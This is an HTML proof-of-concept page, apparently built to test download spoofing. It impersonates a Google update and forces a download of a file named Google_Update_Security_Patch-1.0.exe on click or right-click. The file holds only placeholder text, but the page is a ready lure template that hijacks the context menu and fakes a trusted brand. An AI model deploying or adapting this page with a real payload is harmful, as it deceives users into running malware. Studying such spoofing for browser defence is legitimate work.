<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>DOWNLOAD UPDATE FROM GOOGLE</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding-top: 50px;
        background: #f8f9fa;
      }
      .drive-link {
        color: #1a73e8;
        text-decoration: none;
        font-weight: bold;
        padding: 12px 24px;
        border: 1px solid #dadce0;
        border-radius: 8px;
        background: white;
        display: inline-block;
        box-shadow: 0 2px 6px rgba(0,0,0,0.08);
        cursor: pointer;
        transition: all 0.2s;
      }
      .drive-link:hover {
        background: #f1f3f4;
      }
      #status {
        margin-top: 25px;
        color: #5f6368;
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <h2>DOWNLOAD UPDATE FROM GOOGLE</h2>
    <p style="color: #666; margin-bottom: 25px;">Click below or Right Click / Long Press to test download spoofing</p>

    <a id="link" class="drive-link" href="#">
      Download Security Patch v1.0 (.exe)
    </a>

    <div id="status"></div>

    <script>
      const link = document.getElementById("link");
      const status = document.getElementById("status");

      function startDownload() {
        status.innerText = "Synchronizing with Split View...";

        setTimeout(function () {
          const fakeData = "[PoC Security Demonstration]\nFilename: Google_Update_Security_Patch-1.0.exe\nStatus: Download completed successfully.";
          const blob = new Blob([fakeData], {
            type: "application/octet-stream",
          });
          const url = window.URL.createObjectURL(blob);

          const a = document.createElement("a");
          a.style.display = "none";
          a.href = url;
          a.download = "Google_Update_Security_Patch-1.0.exe";

          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);

          window.URL.revokeObjectURL(url);
          status.innerText = "Update downloaded successfully: Google_Update_Security_Patch-1.0.exe";
        }, 1000);
      }

      link.addEventListener("click", function (event) {
        event.preventDefault();
        startDownload();
      });

      link.addEventListener("contextmenu", function (event) {
        event.preventDefault();
        startDownload();
      });
    </script>
  </body>
</html>
